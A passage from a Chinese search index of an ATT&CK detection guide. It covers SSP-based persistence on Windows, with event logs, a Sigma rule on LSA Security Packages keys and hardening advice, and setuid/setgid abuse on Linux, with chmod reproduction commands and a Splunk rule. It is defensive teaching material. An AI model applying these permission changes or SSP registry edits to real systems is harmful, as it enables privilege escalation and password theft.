[00000000:000003e5] [00000005] \\ (LOCAL SERVICE)","title":"\u65b9\u6cd5\u4e8c"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_6","text":"\u5efa\u8bae\u5728windows server 2008\uff08\u542b2008\uff09\u4ee5\u4e0b\u7248\u672c\u5b89\u88c5\u90e8\u7f72sysmon\uff0c\u8bb0\u5f55\u8fdb\u7a0b\u540d\u79f0\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u65b9\u4fbf\u6eaf\u6e90\u5206\u6790\uff1b \u5efa\u8bae\u5728windows server 2008\u4ee5\u4e0a\u7248\u672c\u64cd\u4f5c\u7cfb\u7edf\u4e2d\u5f00\u542f\u5ba1\u6838\u8fdb\u7a0b\u521b\u5efa\u7b56\u7565\uff0c\u8bb0\u5f55\u8fdb\u7a0b\u540d\u79f0\u3001\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff0c\u65b9\u4fbf\u6eaf\u6e90\u5206\u6790\u3002 #\u9488\u5bf9\u65b9\u6cd5\u4e8c\u7559\u75d5 EVentID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 \u5bf9\u8c61: \u5bf9\u8c61\u670d\u52a1\u5668: Security \u5bf9\u8c61\u7c7b\u578b: Key \u5bf9\u8c61\u540d: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN \u53e5\u67c4 ID: 0x508 \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x748 \u8fdb\u7a0b\u540d: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f: \u4e8b\u52a1 ID: {00000000-0000-0000-0000-000000000000} \u8bbf\u95ee: READ_CONTROL \u67e5\u8be2\u9879\u503c \u679a\u4e3e\u5b50\u9879 \u5bf9\u9879\u7684\u6539\u52a8\u8fdb\u884c\u901a\u77e5 EVentID: 4658 #\u5df2\u5173\u95ed\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 \u5bf9\u8c61: \u5bf9\u8c61\u670d\u52a1\u5668: Security \u53e5\u67c4 ID: 0x508 \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0xbd8 \u8fdb\u7a0b\u540d: C:\\Windows\\System32\\Oobe.exe EVentID: 4688 #\u5df2\u521b\u5efa\u65b0\u8fdb\u7a0b\u3002\u5728\u9ad8\u7248\u672c\u7cfb\u7edf\u4e2d\u53ef\u8bb0\u5f55\u547d\u4ee4\u884c\u53c2\u6570 \u8fdb\u7a0b\u4fe1\u606f: \u65b0\u8fdb\u7a0b ID: 0x5c8 \u65b0\u8fdb\u7a0b\u540d: C:\\Windows\\System32\\reg.exe \u4ee4\u724c\u63d0\u5347\u7c7b\u578b: TokenElevationTypeDefault (1) EVentID: 4656 #\u5df2\u8bf7\u6c42\u5230\u5bf9\u8c61\u7684\u53e5\u67c4\u3002 \u5bf9\u8c61: \u5bf9\u8c61\u670d\u52a1\u5668: Security \u5bf9\u8c61\u7c7b\u578b: Key \u5bf9\u8c61\u540d: \\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WSMAN\\Plugin\\Microsoft.ServerManager \u53e5\u67c4 ID: 0x694 \u8fdb\u7a0b\u4fe1\u606f: \u8fdb\u7a0b ID: 0x864 \u8fdb\u7a0b\u540d: C:\\Windows\\System32\\Oobe.exe \u8bbf\u95ee\u8bf7\u6c42\u4fe1\u606f: \u4e8b\u52a1 ID: {00000000-0000-0000-0000-000000000000} \u8bbf\u95ee: READ_CONTROL \u67e5\u8be2\u9879\u503c \u679a\u4e3e\u5b50\u9879 \u5bf9\u9879\u7684\u6539\u52a8\u8fdb\u884c\u901a\u77e5","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_7","text":"","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#sigma","text":"title: \u6dfb\u52a0\u5230LSA\u914d\u7f6e\u7684\u5b89\u5168\u652f\u6301\u63d0\u4f9b\u7a0b\u5e8f\uff08SSP\uff09 status: \u6d4b\u8bd5\u9636\u6bb5 description: \u68c0\u6d4b\u5411\u6ce8\u518c\u8868\u6dfb\u52a0SSP\u3002\u5728\u91cd\u65b0\u542f\u52a8\u6216API\u8c03\u7528\u540e\uff0cSSP DLL\u53ef\u4ee5\u8bbf\u95ee\u5b58\u50a8\u5728Windows\u4e2d\u7684\u52a0\u5bc6\u5bc6\u7801\u548c\u660e\u6587\u5bc6\u7801\u3002 references: - https://attack.mitre.org/techniques/T1547/005/ - https://powersploit.readthedocs.io/en/latest/Persistence/Install-SSP/ tags: - attack.persistence - attack.t1547 logsource: product: windows service: sysmon detection: selection_registry: EventID: 13 #\u521b\u5efa\u6ce8\u518c\u8868\u503c sysmon\u65e5\u5fd7 TargetObject: - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages' - 'HKLM\\System\\CurrentControlSet\\Control\\Lsa\\OSConfig\\Security Packages' exclusion_images: - Image: C:\\Windows\\system32\\msiexec.exe - Image: C:\\Windows\\syswow64\\MsiExec.exe condition: selection_registry and not exclusion_images falsepositives: - \u4e0d\u592a\u53ef\u80fd level: \u5173\u952e","title":"Sigma\u89c4\u5219"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_8","text":"\u76d1\u63a7\u6ce8\u518c\u8868\u6765\u67e5\u770bSSP\u6ce8\u518c\u8868\u9879\u662f\u5426\u6709\u66f4\u6539\u3002\u76d1\u63a7LSA\u8fdb\u7a0b\u6765\u67e5\u770b\u662f\u5426\u6709\u52a8\u6001\u94fe\u63a5\u5e93\u52a0\u8f7d\u7684\u60c5\u51b5\u3002Windows 8.1\u548cWindows Server 2012 R2\u4e2d\uff0c\u5728\u6ce8\u518c\u8868\u9879HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File ExecutionOptions\\LSASS.exe\u4e2d\u8bbe\u7f6eAuditLevel\u00df=8\u6765\u52a0\u8f7d\u672a\u7b7e\u540d\u7684SSP\u52a8\u6001\u94fe\u63a5\u5e93\u5230LSA\u65f6\u4f1a\u751f\u6210\u4e8b\u4ef6\u3002","title":"\u5efa\u8bae"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_9","text":"1.\u68c0\u67e5\u6ce8\u518c\u8868 hklm\\system\\currentcontrolset\\control\\lsa\\Security Packages\u4f4d\u7f6e\u662f\u5426\u5b58\u5728\u53ef\u7591dll\u3002 2.\u68c0\u6d4b%windir%\\System32\u662f\u5426\u6709\u53ef\u7591dll 3.\u4f7f\u7528\u7b2c\u4e09\u65b9\u5de5\u5177 Autoruns \u68c0\u6d4bLSA\u4e2d\u662f\u5426\u5b58\u5728\u53ef\u7591dll\u3002 Autoruns\u4e0b\u8f7d\uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/autoruns","title":"\u5b89\u5168\u9632\u5fa1\u63aa\u65bd"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1547-005-win-SSP%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/#_10","text":"MITRE-ATT&CK-T1547-005 https://attack.mitre.org/techniques/T1547/005/ AD\u57dfSSP\u6743\u9650\u7ef4\u6301\u4e0e\u5b89\u5168\u9632\u62a4 https://xz.aliyun.com/t/7432","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/","text":"T1548-001-linux-Setuid and Setgid \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528setuid\u6216setgid\u4f4d\u6267\u884c\u5916\u58f3\u8f6c\u4e49\u6216\u5229\u7528\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e\u6765\u83b7\u53d6\u5728\u4e0d\u540c\u7528\u6237\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u7684\u4ee3\u7801\u3002\u5728Linux\u6216macOS\u4e0a\uff0c\u5f53\u4e3a\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6e\u4e86setuid\u6216setgid\u4f4d\u65f6\uff0c\u8be5\u5e94\u7528\u7a0b\u5e8f\u5c06\u5206\u522b\u4ee5\u62e5\u6709\u7528\u6237\u6216\u7ec4\u7684\u7279\u6743\u8fd0\u884c\u3002\u901a\u5e38\uff0c\u5e94\u7528\u7a0b\u5e8f\u662f\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u7684\uff0c\u800c\u4e0d\u7ba1\u54ea\u4e2a\u7528\u6237\u6216\u7ec4\u62e5\u6709\u8be5\u5e94\u7528\u7a0b\u5e8f\u3002\u4f46\u662f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u5728\u63d0\u5347\u6743\u9650\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u7a0b\u5e8f\u624d\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c\u4f46\u8fd0\u884c\u5b83\u4eec\u7684\u7528\u6237\u4e0d\u9700\u8981\u63d0\u5347\u6743\u9650\u3002 \u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u4e3a\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6esetuid\u6216setgid\u6807\u5fd7\uff0c\u800c\u4e0d\u5fc5\u5728sudoers\u6587\u4ef6\u4e2d\u521b\u5efa\u6761\u76ee\uff08\u5fc5\u987b\u7531root\u7528\u6237\u5b8c\u6210\uff09\u3002\u901a\u8fc7\u89c2\u770b\u6587\u4ef6\u5c5e\u6027\u65f6\uff0c\u8fd9\u4e9b\u4f4d\u7528\u201cs\u201d\u800c\u4e0d\u662f\u201cx\u201d\u8868\u793als -l\u3002\u8be5chmod\u7a0b\u5e8f\u80fd\u591f\u7ecf\u7531bitmasking\u8bbe\u7f6e\u8fd9\u4e9b\u4f4d\u4e0e\uff0cchmod 4777 [file]\u6216\u901a\u8fc7\u901f\u8bb0\u547d\u540d\uff0cchmod u+s [file]\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5bf9\u81ea\u5df1\u7684\u6076\u610f\u8f6f\u4ef6\u4f7f\u7528\u6b64\u673a\u5236\uff0c\u4ee5\u786e\u4fdd\u4ed6\u4eec\u5c06\u6765\u80fd\u591f\u5728\u63d0\u5347\u7684\u73af\u5883\u4e2d\u6267\u884c\u3002 \u5173\u4e8eSetuid and Setgid\u8be6\u89e3 \u6587\u4ef6\u6743\u9650\u7684\u673a\u5236\u662fLinux\u7cfb\u7edf\u7684\u4e00\u5927\u7279\u8272\uff0c\u5bf9\u4e8e\u521d\u5b66Linux\u7684\u4eba\u5bf9\u53ef\u8bfb\uff08r\uff09\u3001\u53ef\u5199\uff08w\uff09\u3001\u53ef\u6267\u884c\uff08x\uff09\u8fd9\u90fd\u662f\u6bd4\u8f83\u57fa\u672c\u7684\u6743\u9650\u3002\u4e00\u4e2a\u6587\u4ef6\u7684\u6743\u9650\u6709\u5341\u4e2a\u4f4d\uff0c\u5206\u4e3a\u4e09\u7ec4\u6765\u8868\u793a\u3002\u7b2c\u4e00\u4e2a\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u8868\u793a\u6587\u4ef6\u7684\u7c7b\u578b\uff1a -\uff1a\u8868\u793a\u4e00\u822c\u6587\u4ef6 d\uff1a\u8868\u793a\u76ee\u5f55\u6587\u4ef6 l\uff1a\u8868\u793a\u94fe\u63a5\u6587\u4ef6 b\uff1a\u8868\u793a\u5757\u8bbe\u5907 c\uff1a\u8868\u793a\u5b57\u7b26\u8bbe\u5907 p\uff1a\u8868\u793a\u7ba1\u9053 s\uff1a\u8868\u793a\u5957\u63a5\u5b57 \u4f46\u662fLinux\u8fd8\u6709\u4e09\u4e2a\u6bd4\u8f83\u7279\u6b8a\u7684\u6743\u9650\uff0c\u5206\u522b\u662f\uff1asetuid\uff0csetgid\uff0cstick bit \uff08\u7c98\u6ede\u4f4d\uff09\u3002 setuid: \u8bbe\u7f6e\u4f7f\u6587\u4ef6\u5728\u6267\u884c\u9636\u6bb5\u5177\u6709\u6587\u4ef6\u6240\u6709\u8005\u7684\u6743\u9650. \u5178\u578b\u7684\u6587\u4ef6\u662f /usr/bin/passwd. \u5982\u679c\u4e00\u822c\u7528\u6237\u6267\u884c\u8be5\u6587\u4ef6, \u5219\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d, \u8be5\u6587\u4ef6\u53ef\u4ee5\u83b7\u5f97root\u6743\u9650, \u4ece\u800c\u53ef\u4ee5\u66f4\u6539\u7528\u6237\u7684\u5bc6\u7801\u3002 setgid: \u8be5\u6743\u9650\u53ea\u5bf9\u76ee\u5f55\u6709\u6548. \u76ee\u5f55\u88ab\u8bbe\u7f6e\u8be5\u4f4d\u540e, \u4efb\u4f55\u7528\u6237\u5728\u6b64\u76ee\u5f55\u4e0b\u521b\u5efa\u7684\u6587\u4ef6\u90fd\u5177\u6709\u548c\u8be5\u76ee\u5f55\u6240\u5c5e\u7684\u7ec4\u76f8\u540c\u7684\u7ec4\u3002 stick bit: \u8be5\u4f4d\u53ef\u4ee5\u7406\u89e3\u4e3a\u9632\u5220\u9664\u4f4d. \u4e00\u4e2a\u6587\u4ef6\u662f\u5426\u53ef\u4ee5\u88ab\u67d0\u7528\u6237\u5220\u9664, \u4e3b\u8981\u53d6\u51b3\u4e8e\u8be5\u6587\u4ef6\u6240\u5c5e\u7684\u7ec4\u662f\u5426\u5bf9\u8be5\u7528\u6237\u5177\u6709\u5199\u6743\u9650. \u5982\u679c\u6ca1\u6709\u5199\u6743\u9650, \u5219\u8fd9\u4e2a\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u90fd\u4e0d\u80fd\u88ab\u5220\u9664, \u540c\u65f6\u4e5f\u4e0d\u80fd\u6dfb\u52a0\u65b0\u7684\u6587\u4ef6. \u5982\u679c\u5e0c\u671b\u7528\u6237\u80fd\u591f\u6dfb\u52a0\u6587\u4ef6\u4f46\u540c\u65f6\u4e0d\u80fd\u5220\u9664\u6587\u4ef6, \u5219\u53ef\u4ee5\u5bf9\u6587\u4ef6\u4f7f\u7528stick bit\u4f4d. \u8bbe\u7f6e\u8be5\u4f4d\u540e, \u5c31\u7b97\u7528\u6237\u5bf9\u76ee\u5f55\u5177\u6709\u5199\u6743\u9650, \u4e5f\u4e0d\u80fd\u5220\u9664\u8be5\u6587\u4ef6\u3002 \u6d4b\u8bd5\u6848\u4f8b \u64cd\u4f5c\u8fd9\u4e9b\u6807\u5fd7\u4e0e\u64cd\u4f5c\u6587\u4ef6\u6743\u9650\u7684\u547d\u4ee4\u662f\u4e00\u6837\u7684, \u90fd\u662f chmod. \u6709\u4e24\u79cd\u65b9\u6cd5\u6765\u64cd\u4f5c\uff1a \u65b9\u6cd5\u4e00 chmod u+s xxx # \u8bbe\u7f6esetuid\u6743\u9650\uff0c\u52a0\u4e0asetuid\u6807\u5fd7(setuid \u53ea\u5bf9\u6587\u4ef6\u6709\u6548) chmod g+s xxx # \u8bbe\u7f6esetgid\u6743\u9650\uff0c\u52a0\u4e0asetgid\u6807\u5fd7 (setgid \u53ea\u5bf9\u76ee\u5f55\u6709\u6548) chmod o+t xxx # \u8bbe\u7f6estick bit\u6743\u9650\uff0c\u9488\u5bf9\u76ee\u5f55 \u65b9\u6cd5\u4e8c \u91c7\u7528\u516b\u8fdb\u5236\u65b9\u5f0f. \u5bf9\u4e00\u822c\u6587\u4ef6\u901a\u8fc7\u4e09\u7ec4\u516b\u8fdb\u5236\u6570\u5b57\u6765\u7f6e\u6807\u5fd7, \u5982 666, 777, 644\u7b49. \u5982\u679c\u8bbe\u7f6e\u8fd9\u4e9b\u7279\u6b8a\u6807\u5fd7, \u5219\u5728\u8fd9\u7ec4 \u6570\u5b57\u4e4b\u5916\u5916\u52a0\u4e00\u7ec4\u516b\u8fdb\u5236\u6570\u5b57. \u59824666, 2777\u7b49 chmod 4775 xxx # \u8bbe\u7f6esetuid\u6743\u9650 chmod 2775 xxx # \u8bbe\u7f6esetgid\u6743\u9650 chmod 1775 xxx # \u8bbe\u7f6estick bit\u6743\u9650\uff0c\u9488\u5bf9\u76ee\u5f55 \u5728\u8fd9\u91cc\u53ea\u8bb2\u7b2c\u4e00\u4f4d8\u8fdb\u5236\u4ee3\u8868\u6743\u9650 0: \u4e0d\u8bbe\u7f6e\u7279\u6b8a\u6743\u9650 1\uff1a\u53ea\u8bbe\u7f6esticky 2\uff1a\u53ea\u8bbe\u7f6eSGID 3\uff1a\u53ea\u8bbe\u7f6eSGID\u548csticky 4\uff1a\u53ea\u8bbe\u7f6eSUID 5\uff1a\u53ea\u8bbe\u7f6eSUID\u548csticky 6\uff1a\u53ea\u8bbe\u7f6eSUID\u548cSGID 7\uff1a\u8bbe\u7f6e3\u79cd\u6743\u9650 \u8bbe\u7f6e\u5b8c\u8fd9\u4e9b\u6807\u5fd7\u540e, \u53ef\u4ee5\u7528 ls -l \u6765\u67e5\u770b. \u5982\u679c\u6709\u8fd9\u4e9b\u6807\u5fd7, \u5219\u4f1a\u5728\u539f\u6765\u7684\u6267\u884c\u6807\u5fd7\u4f4d\u7f6e\u4e0a\u663e\u793a\u3002\u90a3\u4e48\u539f\u6765\u7684\u6267\u884c\u6807\u5fd7x\u5230\u54ea\u91cc\u53bb\u4e86\u5462? \u7cfb\u7edf\u662f\u8fd9\u6837\u89c4\u5b9a\u7684, \u5982\u679c\u672c\u6765\u5728\u8be5\u4f4d\u4e0a\u6709x, \u5219\u8fd9\u4e9b\u7279\u6b8a\u6807\u5fd7\u663e\u793a\u4e3a\u5c0f\u5199\u5b57\u6bcd (s, s, t). \u5426\u5219, \u663e\u793a\u4e3a\u5927\u5199\u5b57\u6bcd (S, S, T)\u3002 \u6ce8\uff1a\u5728UNIX\u7cfb\u7edf\u5bb6\u65cf\u91cc\uff0c\u6587\u4ef6\u6216\u76ee\u5f55\u6743\u9650\u7684\u63a7\u5236\u5206\u522b\u4ee5\u8bfb\u53d6\uff0c\u5199\u5165\uff0c\u6267\u884c3\u79cd\u4e00\u822c\u6743\u9650\u6765\u533a\u5206\uff0c\u53e6\u67093\u79cd\u7279\u6b8a\u6743\u9650 \u53ef\u4f9b\u8fd0\u7528\uff0c\u518d\u642d\u914d\u62e5\u6709\u8005\u4e0e\u6240\u5c5e\u7fa4\u7ec4\u7ba1\u7406\u6743\u9650\u8303\u56f4\u3002\u60a8\u53ef\u4ee5\u4f7f\u7528chmod\u6307\u4ee4\u53bb\u53d8\u66f4\u6587\u4ef6\u4e0e\u76ee\u5f55\u7684\u6743\u9650\uff0c\u8bbe\u7f6e\u65b9\u5f0f \u91c7\u7528\u6587\u5b57\u6216\u6570\u5b57\u4ee3\u53f7\u7686\u53ef\u3002\u7b26\u53f7\u8fde\u63a5\u7684\u6743\u9650\u65e0\u6cd5\u53d8\u66f4\uff0c\u5982\u679c\u60a8\u5bf9\u7b26\u53f7\u8fde\u63a5\u4fee\u6539\u6743\u9650\uff0c\u5176\u6539\u53d8\u4f1a\u4f5c\u7528\u5728\u88ab\u8fde\u63a5\u7684\u539f\u59cb \u6587\u4ef6\u3002\u6743\u9650\u8303\u56f4\u7684\u8868\u793a\u6cd5\u5982\u4e0b\uff1a u\uff1aUser\uff0c\u5373\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u62e5\u6709\u8005\u3002 g\uff1aGroup\uff0c\u5373\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6240\u5c5e\u7fa4\u7ec4\u3002 o\uff1aOther\uff0c\u9664\u4e86\u6587\u4ef6\u6216\u76ee\u5f55\u62e5\u6709\u8005\u6216\u6240\u5c5e\u7fa4\u7ec4\u4e4b\u5916\uff0c\u5176\u4ed6\u7528\u6237\u7686\u5c5e\u4e8e\u8fd9\u4e2a\u8303\u56f4\u3002 a\uff1aAll\uff0c\u5373\u5168\u90e8\u7684\u7528\u6237\uff0c\u5305\u542b\u62e5\u6709\u8005\uff0c\u6240\u5c5e\u7fa4\u7ec4\u4ee5\u53ca\u5176\u4ed6\u7528\u6237\u3002 \u6709\u5173\u6743\u9650\u4ee3\u53f7\u7684\u90e8\u5206\uff0c\u5217\u8868\u4e8e\u4e0b\uff1a r\uff1a\u8bfb\u53d6\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"4\"\u3002 w\uff1a\u5199\u5165\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"2\"\u3002 x\uff1a\u6267\u884c\u6216\u5207\u6362\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"1\"\u3002 -\uff1a\u4e0d\u5177\u4efb\u4f55\u6743\u9650\uff0c\u6570\u5b57\u4ee3\u53f7\u4e3a\"0\"\u3002 s\uff1a\u7279\u6b8a?b>\u529f\u80fd\u8bf4\u660e\uff1a\u53d8\u66f4\u6587\u4ef6\u6216\u76ee\u5f55\u7684\u6743\u9650\u3002 \u68c0\u6d4b\u65e5\u5fd7 bash\u5386\u53f2\u8bb0\u5f55 \u6d4b\u8bd5\u590d\u73b0 \u65b9\u6cd5\u4e00/ icbc@icbc:/hacker$ ls -l -rw-r--r-- 1 root root 0 7\u6708 19 17:22 bas.txt icbc@icbc:/hacker$ sudo chmod u+s bas.txt icbc@icbc:/hacker$ ls -l -rwSr--r-- 1 root root 0 7\u6708 19 17:22 bas.txt icbc@icbc:/hacker$ sudo chmod g+s bas.txt icbc@icbc:/hacker$ ls -l -rwSr-Sr-- 1 root root 0 7\u6708 19 17:22 bas.txt \u65b9\u6cd5\u4e8c/ icbc@icbc:/hacker$ ls -l -rwxr-xr-x 1 root root 0 8\u6708 28 15:16 admin.txt icbc@icbc:/hacker$ sudo chmod 4777 admin.txt icbc@icbc:/hacker$ ls -l -rwsrwxrwx 1 root root 0 8\u6708 28 15:16 admin.txt icbc@icbc:/hacker$ sudo chmod 2777 admin.txt icbc@icbc:/hacker$ ls -l -rwxrwsrwx 1 root root 0 8\u6708 28 15:16 admin.txt \u6d4b\u8bd5\u7559\u75d5 \u65b9\u6cd5\u4e00 / icbc@icbc:/hacker$ history 650 chmod u+s bas.txt 651 sudo chmod u+s bas.txt 652 ls -l 653 sudo chmod g+s bas.txt \u65b9\u6cd5\u4e8c / icbc@icbc:/hacker$ history 683 sudo chmod 4777 admin.txt 684 ls -l 685 sudo chmod 2777 admin.txt \u68c0\u6d4b\u89c4\u5219/\u601d\u8def splunk\u68c0\u6d4b\u89c4\u5219\uff1aindex=linux sourcetype=bash_history \"chmod 4*** \" OR \"chmod 2*** \" OR \"chmod u+s\" OR \"chmod g+s\" | table host,user_name,bash_command \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1548-001 https://attack.mitre.org/techniques/T1548/001/ linux\u6587\u4ef6\u7279\u6b8a\u6743\u9650 https://www.cnblogs.com/patriot/p/7874725.html linux\u4e2dchmod\u547d\u4ee4\u8be6\u89e3 https://www.cnblogs.com/lianstyle/p/8571975.html linux\u4e0b\u7684chmod\u53c2\u6570\u8be6\u89e3 https://blog.csdn.net/taiyang1987912/article/details/41121131","title":"T1548-001-linux-Setuid and Setgid"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#t1548-001-linux-setuid-and-setgid","text":"","title":"T1548-001-linux-Setuid and Setgid"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#attck","text":"\u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528setuid\u6216setgid\u4f4d\u6267\u884c\u5916\u58f3\u8f6c\u4e49\u6216\u5229\u7528\u5e94\u7528\u7a0b\u5e8f\u4e2d\u7684\u6f0f\u6d1e\u6765\u83b7\u53d6\u5728\u4e0d\u540c\u7528\u6237\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u7684\u4ee3\u7801\u3002\u5728Linux\u6216macOS\u4e0a\uff0c\u5f53\u4e3a\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6e\u4e86setuid\u6216setgid\u4f4d\u65f6\uff0c\u8be5\u5e94\u7528\u7a0b\u5e8f\u5c06\u5206\u522b\u4ee5\u62e5\u6709\u7528\u6237\u6216\u7ec4\u7684\u7279\u6743\u8fd0\u884c\u3002\u901a\u5e38\uff0c\u5e94\u7528\u7a0b\u5e8f\u662f\u5728\u5f53\u524d\u7528\u6237\u7684\u4e0a\u4e0b\u6587\u4e2d\u8fd0\u884c\u7684\uff0c\u800c\u4e0d\u7ba1\u54ea\u4e2a\u7528\u6237\u6216\u7ec4\u62e5\u6709\u8be5\u5e94\u7528\u7a0b\u5e8f\u3002\u4f46\u662f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c\u9700\u8981\u5728\u63d0\u5347\u6743\u9650\u7684\u4e0a\u4e0b\u6587\u4e2d\u6267\u884c\u7a0b\u5e8f\u624d\u80fd\u6b63\u5e38\u8fd0\u884c\uff0c\u4f46\u8fd0\u884c\u5b83\u4eec\u7684\u7528\u6237\u4e0d\u9700\u8981\u63d0\u5347\u6743\u9650\u3002 \u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u4e3a\u81ea\u5df1\u7684\u5e94\u7528\u7a0b\u5e8f\u8bbe\u7f6esetuid\u6216setgid\u6807\u5fd7\uff0c\u800c\u4e0d\u5fc5\u5728sudoers\u6587\u4ef6\u4e2d\u521b\u5efa\u6761\u76ee\uff08\u5fc5\u987b\u7531root\u7528\u6237\u5b8c\u6210\uff09\u3002\u901a\u8fc7\u89c2\u770b\u6587\u4ef6\u5c5e\u6027\u65f6\uff0c\u8fd9\u4e9b\u4f4d\u7528\u201cs\u201d\u800c\u4e0d\u662f\u201cx\u201d\u8868\u793als -l\u3002\u8be5chmod\u7a0b\u5e8f\u80fd\u591f\u7ecf\u7531bitmasking\u8bbe\u7f6e\u8fd9\u4e9b\u4f4d\u4e0e\uff0cchmod 4777 [file]\u6216\u901a\u8fc7\u901f\u8bb0\u547d\u540d\uff0cchmod u+s [file]\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u5bf9\u81ea\u5df1\u7684\u6076\u610f\u8f6f\u4ef6\u4f7f\u7528\u6b64\u673a\u5236\uff0c\u4ee5\u786e\u4fdd\u4ed6\u4eec\u5c06\u6765\u80fd\u591f\u5728\u63d0\u5347\u7684\u73af\u5883\u4e2d\u6267\u884c\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1548-001-linux-Setuid%20and%20Setgid/#setuid-and-setgid","text":"\u6587\u4ef6\u6743\u9650\u7684\u673a\u5236\u662fLinux\u7cfb\u7edf\u7684\u4e00\u5927\u7279\u8272\uff0c\u5bf9\u4e8e\u521d\u5b66Linux\u7684\u4eba\u5bf9\u53ef\u8bfb\uff08r\uff09\u3001\u53ef\u5199\uff08w\uff09\u3001\u53ef\u6267\u884c\uff08x\uff09\u8fd9\u90fd\u662f\u6bd4\u8f83\u57fa\u672c\u7684\u6743\u9650\u3002\u4e00\u4e2a\u6587\u4ef6\u7684\u6743\u9650\u6709\u5341\u4e2a\u4f4d\uff0c\u5206\u4e3a\u4e09\u7ec4\u6765\u8868\u793a\u3002\u7b2c\u4e00\u4e2a\u4f4d\u4e3a\u4e00\u7ec4\uff0c\u8868\u793a\u6587\u4ef6\u7684\u7c7b\u578b\uff1a -\uff1a\u8868\u793a\u4e00\u822c\u6587\u4ef6 d\uff1a\u8868\u793a\u76ee\u5f55\u6587\u4ef6 l\uff1a\u8868\u793a\u94fe\u63a5\u6587\u4ef6 b\uff1a\u8868\u793a\u5757\u8bbe\u5907 c\uff1a\u8868\u793a\u5b57\u7b26\u8bbe\u5907 p\uff1a\u8868\u793a\u7ba1\u9053 s\uff1a\u8868\u793a\u5957\u63a5\u5b57 \u4f46\u662fLinux\u8fd8\u6709\u4e09\u4e2a\u6bd4\u8f83\u7279\u6b8a\u7684\u6743\u9650\uff0c\u5206\u522b\u662f\uff1asetuid\uff0csetgid\uff0cstick bit \uff08\u7c98\u6ede\u4f4d\uff09\u3002 setuid: \u8bbe\u7f6e\u4f7f\u6587\u4ef6\u5728\u6267\u884c\u9636\u6bb5\u5177\u6709\u6587\u4ef6\u6240\u6709\u8005\u7684\u6743\u9650. \u5178\u578b\u7684\u6587\u4ef6\u662f /usr/bin/passwd. \u5982\u679c\u4e00\u822c\u7528\u6237\u6267\u884c\u8be5\u6587\u4ef6, \u5219\u5728\u6267\u884c\u8fc7\u7a0b\u4e2d, 